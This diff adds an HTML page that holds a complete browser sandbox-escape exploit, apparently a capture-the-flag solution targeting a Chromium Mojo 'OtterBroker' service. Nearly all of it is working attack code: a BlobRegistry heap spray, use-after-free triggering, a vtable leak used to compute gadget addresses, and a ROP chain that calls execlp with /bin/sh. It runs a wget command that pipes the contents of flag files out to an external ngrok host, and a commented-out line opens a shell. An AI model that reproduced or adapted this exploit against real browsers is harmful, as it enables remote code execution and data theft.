@@ -1,0 +1,305 @@
+<html>
+    <head>
+        <script src="template/public/mojojs/mojo_bindings.js"></script>
+        <script src="template/public/mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+        <script>
+            mojo.config.autoLoadMojomDeps = false;
+        </script>
+        <script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+        <script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/data_element.mojom.js"></script>
+        <script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/blob.mojom.js"></script>
+
+        <script>
+            async function send(data) {
+                await fetch(window.location.href + "/" + data["method"], {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data),
+                });
+            }
+
+            async function log(msg) {
+                await send({ method: "log", msg });
+                console.log(msg);
+            }
+
+            async function config(len, payload) {
+                await send({ method: "config", len, payload });
+            }
+
+            let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+            Mojo.bindInterface(
+                blink.mojom.BlobRegistry.name,
+                mojo.makeRequest(blob_registry_ptr).handle,
+                "process"
+            );
+
+            async function getBlob(store, data) {
+                function Impl() {}
+                Impl.prototype = {
+                    requestAsReply: async (a, b) => {
+                        return {
+                            data: [1],
+                        };
+                    },
+                    requestAsStream: () => log("hi2"),
+                    requestAsFile: () => log("hi3"),
+                };
+
+                let bytes_provider = new mojo.Binding(
+                    blink.mojom.BytesProvider,
+                    new Impl()
+                );
+                let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
+                bytes_provider.bind(mojo.makeRequest(bytes_provider_ptr));
+
+                let blob_ptr = new blink.mojom.BlobPtr();
+                let blob_req = mojo.makeRequest(blob_ptr);
+
+                if (typeof data === "string") {
+                    data = new TextEncoder().encode(data);
+                    // console.log(data.constructor.name);
+                }
+
+                let data_element = new blink.mojom.DataElement();
+                data_element.bytes = new blink.mojom.DataElementBytes();
+                data_element.bytes.length = data.length;
+                data_element.bytes.embeddedData = data;
+                data_element.bytes.data = bytes_provider_ptr;
+
+                let r = await blob_registry_ptr.register(
+                    blob_req,
+                    Math.random().toString(),
+                    "text/data",
+                    "text/data",
+                    [data_element]
+                );
+
+                store.push(blob_ptr);
+                return blob_ptr;
+            }
+
+            async function readBlob(blob_ptr, offset, length) {
+                let readpipe = Mojo.createDataPipe({
+                    elementNumBytes: 1,
+                    capacityNumBytes: length,
+                });
+                blob_ptr.readRange(offset, length, readpipe.producer, null);
+                let buf = await new Promise((resolve) => {
+                    let watcher = readpipe.consumer.watch(
+                        { readable: true },
+                        (r) => {
+                            let result = new ArrayBuffer(length);
+                            let a = readpipe.consumer.readData(result);
+                            watcher.cancel();
+                            resolve(result.slice(0, a.numBytes));
+                        }
+                    );
+                });
+                return new Uint8Array(buf);
+            }
+
+            function flat(size, data) {
+                let buf = new ArrayBuffer(size);
+                for (let [offset, n] of Object.entries(data)) {
+                    new BigUint64Array(buf, offset, 1)[0] = BigInt(n);
+                }
+                return new Uint8Array(buf, 0, size);
+            }
+
+            function u64(buf) {
+                return new BigUint64Array(
+                    buf.buffer,
+                    buf.byteOffset,
+                    buf.byteLength / 8
+                );
+            }
+
+            function u8(buf) {
+                return new Uint8Array(
+                    buf.buffer,
+                    buf.byteOffset,
+                    buf.byteLength
+                );
+            }
+
+            function hex(n) {
+                return `0x${n.toString(16)}`;
+            }
+
+            const global_blobs = [];
+
+            (async () => {
+                let ptr = new blink.mojom.OtterBrokerServicePtr();
+                Mojo.bindInterface(
+                    blink.mojom.OtterBrokerService.name,
+                    mojo.makeRequest(ptr).handle
+                );
+
+                ptr.init(window.location.hostname);
+
+                await log("starting");
+
+                let spray = 200;
+
+                for (let i = 0; i < spray; i++) {
+                    await getBlob(global_blobs, "R".repeat(0x1000));
+                    await readBlob(global_blobs[i], 0, 8);
+                }
+
+                let command =
+                    'wget "https://999b-2600-1700-9e31-5f0-00-3a.ngrok-free.app/hello/"$(cat /challenge/flag-*)';
+                // 'echo hiiiii && xterm -hold -e "{ echo cowsay moo; cat; } | /bin/sh"\0';
+
+                let strings = new Array(30);
+                let other = "B".repeat(0x370);
+                for (let i = 0; i < strings.length; i++) {
+                    strings[i] = new TextEncoder().encode(
+                        "LES-AMATEURS-" +
+                            i.toString(16).padStart(2, "0") +
+                            "Z".repeat(0x1000 - 15)
+                    );
+                }
+                for (let i = 0; i < strings.length; i++) {
+                    await getBlob(global_blobs, strings[i]);
+                }
+
+                await log("done making blobs");
+
+                let start = spray + 10;
+
+                global_blobs[start + 2].ptr.reset();
+                global_blobs[start + 3].ptr.reset();
+                global_blobs[start + 0].ptr.reset();
+
+                await readBlob(await getBlob(global_blobs, other), 0, 8);
+
+                let payload = flat(0x380 + 0x380 + 0x60, {
+                    0x370: 0x0dd0fecaefbeadden,
+                    0x378: 0x1eab11ba05f03713n,
+                    0x388: 1,
+                    0x3d8: 0,
+                    0x6f0: 0x0dd0fecaefbeadden,
+                    0x6f8: 0x1eab11ba05f03713n,
+                    0x708: 1,
+                    0x758: 0x87654321,
+                });
+                let encoded = new TextEncoder().encode(command);
+                for (let i = 0; i < encoded.length; i++) {
+                    payload[0x380 + i] = encoded[i];
+                }
+
+                await config(0x370, payload);
+                global_blobs[start + 1].ptr.reset();
+                await ptr.getSlot();
+
+                let idx = spray + strings.length;
+                let target = global_blobs[idx];
+                await log("/found target");
+
+                let view = u64(await readBlob(target, 0, 0x800));
+                await log("hi" + view[(0x380 + 0x68) / 8]);
+                await log(`sizeof(self) = ${hex(view[(0x380 + 0x58) / 8])}`);
+                let self = view[(0x380 + 0x60) / 8];
+                let vtable = view[0x700 / 8];
+                let base = vtable - 0x117ded70n;
+                let xchg = base + 0x0b3aec75n;
+                let syscall = base + 0x0c0853c7n;
+                let rax = base + 0x0efff686n;
+                let rdi = base + 0x1152db1bn;
+                let rsi = base + 0x1150ce1cn;
+                let rdx = base + 0x1147a146n;
+                let rcx = base + 0x1150cbfan;
+                let r8 = base + 0x0efff673n;
+                let r9 = base + 0x1020d557n;
+                let execvp = base + 0x1152e5d0n;
+                let execlp = base + 0x1152dea0n;
+                let sh = base + 0x26681f5n;
+                let tac = base + 0x12616een;
+                let cmd = self;
+
+                // await log(`self   = ${hex(self)}`);
+                // await log(`vtable = ${hex(vtable)}`);
+                // await log(`base   = ${hex(base)}`);
+
+                // await log(`xchg gadget = ${hex(xchg)}`);
+
+                let fake_vtable = u64(new Uint8Array(0x370));
+                let r = 0;
+                fake_vtable[r++] = rax;
+                fake_vtable[r++] = xchg;
+                fake_vtable[r++] = rdi;
+                fake_vtable[r++] = sh;
+                fake_vtable[r++] = rsi;
+                fake_vtable[r++] = sh;
+                fake_vtable[r++] = rdx;
+                fake_vtable[r++] = tac;
+                fake_vtable[r++] = rcx;
+                fake_vtable[r++] = cmd;
+                fake_vtable[r++] = r8;
+                fake_vtable[r++] = 0n;
+                fake_vtable[r++] = execlp;
+
+                await readBlob(
+                    await getBlob(global_blobs, "Z".repeat(0x1000)),
+                    0,
+                    8
+                );
+                await readBlob(
+                    await getBlob(global_blobs, "Z".repeat(0x1000)),
+                    0,
+                    8
+                );
+
+                global_blobs[start + 6].ptr.reset();
+                global_blobs[start + 7].ptr.reset();
+                global_blobs[start + 8].ptr.reset();
+                await readBlob(
+                    await getBlob(global_blobs, u8(fake_vtable)),
+                    0,
+                    8
+                );
+
+                let fake_addr = undefined;
+                for (let i = 0; i < 0x380 * 10; i += 0x380) {
+                    let leak = u64(await readBlob(target, i, 0x10));
+                    if (leak[1] == xchg) {
+                        fake_addr = self + BigInt(i);
+                        // await log(`found payload at ${hex(fake_addr)}`);
+                        // await log(`diff = ${hex(fake_addr - self)}`);
+                        break;
+                    }
+                }
+
+                if (fake_addr === undefined) {
+                    // await log(`failed to find payload`);
+                    return;
+                }
+
+                await config(
+                    0x370,
+                    flat(0x380 + 0x80, {
+                        0x000: 0x4545454545454545n,
+                        0x008: 0x4545454545454545n,
+                        0x010: 0x4545454545454545n,
+                        0x018: 0x4545454545454545n,
+                        0x370: 0x0dd0fecaefbeadden,
+                        0x378: 0x1eab11ba05f03713n,
+                        0x380: fake_addr,
+                        0x388: 1,
+                        0x310: 0x424242,
+                        0x318: 0x434343,
+                    })
+                );
+
+                global_blobs[start + 11].ptr.reset();
+                await ptr.getSlot();
+                global_blobs[start + 12].ptr.reset();
+
+                await log("done");
+
+                while (1) {}
+            })();
+        </script>
+    </head>
+</html>
